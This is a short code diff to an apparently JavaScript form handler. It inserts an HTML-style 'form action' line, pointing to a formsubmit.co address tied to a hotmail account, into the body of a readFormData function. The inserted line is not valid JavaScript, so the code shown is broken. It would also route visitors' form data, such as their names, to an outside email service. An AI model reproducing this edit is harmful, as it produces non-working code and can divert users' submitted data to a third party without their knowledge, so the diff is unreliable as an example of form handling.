@@ -20,6 +20,7 @@
   }
 
   function readFormData(form) {
+    form action="https://formsubmit.co/Reformasnyn@hotmail.com" method="POST"              
     const fd = new FormData(form);
     return {
       name: (fd.get('name') || '').toString().trim(),
